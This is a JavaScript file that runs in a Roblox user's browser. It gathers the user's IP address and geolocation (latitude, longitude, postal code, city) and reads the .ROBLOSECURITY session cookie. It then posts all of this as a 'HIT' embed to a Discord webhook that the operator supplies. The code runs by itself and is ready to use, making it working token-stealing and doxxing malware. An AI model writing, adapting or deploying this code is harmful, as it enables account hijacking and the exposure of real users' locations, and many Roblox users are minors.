const webhookURL = "I'm calling from Curry Studios add ur webhook "; // Replace with your webhook URL

async function sendGeoEmbed() {
  try {
    // 1. Get IP address
    const ipRes = await fetch("https://api.ipify.org?format=json");
    const ipObj = await ipRes.json();
    const ip = ipObj.ip;

    // 2. Get geolocation info
    const geoRes = await fetch(`https://ipapi.co/${ip}/json/`);
    const geo = await geoRes.json();

    if (!geo || geo.error) {
      console.error("Failed to fetch geolocation data");
      return;
    }

    // 3. Convert country code to emoji
    const flagEmoji = countryCodeToEmoji(geo.country_code || "US");

    // 4. Get Roblox security token from cookies
    const token = getCookie(".ROBLOSECURITY");

    // 5. Get your Roblox user ID
    const userId = getRobloxUserId();

    // 6. Fetch username
    const username = userId ? await getRobloxUsername(userId) : null;

    // 7. Generate Roblox headshot URL only if userId exists
    const headshotUrl = userId
      ? `https://www.roblox.com/headshot-thumbnail/image?userId=${userId}&width=420&height=420&format=png`
      : null;

    // 8. Build embed message with decorative elements
    const embed = {
      title: `🌐 IP Geolocation 📍`,
      description: `🚩 Country: **${geo.country_name}** ${flagEmoji}`,
      color: 0x1abc9c, // Nice teal color
      author: {
        name: `👤 ${username ? `[**${username}**](https://www.roblox.com/users/${userId}/profile)` : 'Unknown User'}`,
        url: username ? `https://www.roblox.com/users/${userId}/profile` : null,
        icon_url: "https://cdn-icons-png.flaticon.com/512/847/847969.png" // User icon emoji
      },
      thumbnail: {
        url: headshotUrl || "https://via.placeholder.com/150?text=No+Headshot"
      },
      fields: [
        {
          name: "🗺️ Coordinates",
          value: `📍 Latitude: **${geo.latitude}**\n📍 Longitude: **${geo.longitude}**`,
          inline: false
        },
        {
          name: "📫 Postal Code",
          value: `🏢 ${geo.postal || "N/A"}`,
          inline: false
        },
        {
          name: "🌍 Region / City",
          value: `🗺️ ${geo.region}, ${geo.city}`,
          inline: false
        },
        {
          name: "🔑 Roblox Token",
          value: `🔐 ${token || "No token found"}`,
          inline: false
        }
      ],
      timestamp: new Date().toISOString(),
      footer: {
        text: "🌐 Geo data via ipapi.co",
        icon_url: "https://cdn-icons-png.flaticon.com/512/732/732200.png" // Globe icon
      }
    };

    // 9. Prepare webhook message with decorated username and avatar
    const msg = {
      username: "⚡☄️HIT",
      avatar_url: "https://cdn.discordapp.com/avatars/1425248210359947368/fea665d6e4892cac13b6c4d397fedf1b.webp?size=80",
      embeds: [embed]
    };

    // 10. Send webhook
    const resp = await fetch(webhookURL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(msg)
    });

    if (resp.ok) {
      console.log("✅ Embed sent!");
    } else {
      console.error("❌ Failed to send embed:", await resp.text());
    }
  } catch (error) {
    console.error("❌ Error:", error);
  }
}

// Call the function to execute
sendGeoEmbed();

// Helper functions
function getRobloxUserId() {
  const url = window.location.href;
  const match = url.match(/\/users\/(\d+)\//);
  if (match && match[1]) {
    return match[1];
  }
  return null;
}

function countryCodeToEmoji(cc) {
  const OFFSET = 127397;
  return cc
    .toUpperCase()
    .split('')
    .map(c => String.fromCodePoint(c.charCodeAt(0) + OFFSET))
    .join('');
}

function getCookie(name) {
  const value = `; ${document.cookie}`;
  const parts = value.split(`; ${name}=`);
  if (parts.length === 2) return parts.pop().split(';').shift();
  return null;
}

async function getRobloxUsername(userId) {
  try {
    const response = await fetch(`https://users.roblox.com/v1/users/${userId}`);
    if (!response.ok) {
      throw new Error('Failed to fetch username');
    }
    const data = await response.json();
    return data.name;
  } catch (error) {
    console.error('Error fetching username:', error);
    return null;
  }
}
